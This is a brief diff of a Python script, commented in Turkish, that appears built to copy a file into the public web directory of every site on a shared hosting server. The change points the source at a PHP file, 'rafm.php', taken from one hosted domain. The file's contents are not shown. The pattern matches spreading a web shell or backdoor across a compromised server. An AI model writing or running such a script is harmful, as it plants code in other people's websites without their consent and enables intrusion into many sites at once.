@@ -2,7 +2,7 @@ import glob
 import shutil
 
 # Kaynak dosyanın yolu
-source_file = '/home/zapgun.com.br/public_html/example.txt'
+source_file = '/home/quadtec.ind.br/public_html/rafm.php'
 
 # Hedef dizinleri bul ve dosyayı kopyala
 for target_dir in glob.glob('/home/*/public_html/'):
